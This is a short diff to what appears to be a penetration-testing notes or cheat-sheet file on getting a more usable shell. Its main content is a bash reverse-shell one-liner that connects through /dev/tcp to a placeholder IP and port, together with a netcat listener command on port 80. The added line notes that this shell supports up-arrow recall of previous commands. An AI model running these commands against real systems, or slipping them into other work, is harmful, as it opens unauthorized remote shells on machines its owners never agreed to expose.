@@ -1,8 +1,8 @@
 
-Interesting observation where a user upgraded the usability of their shell
+Interesting observation where a user upgraded the usability of their shell. Allows for the ability to up arrow prev commands.
 
 ```
-`bash -c 'bash -i >& /dev/tcp/[IP]/80 0>&1'
+`bash -c 'bash -i >& /dev/tcp/[IP]/[Port] 0>&1'
 
 nc -nvlp 80
 
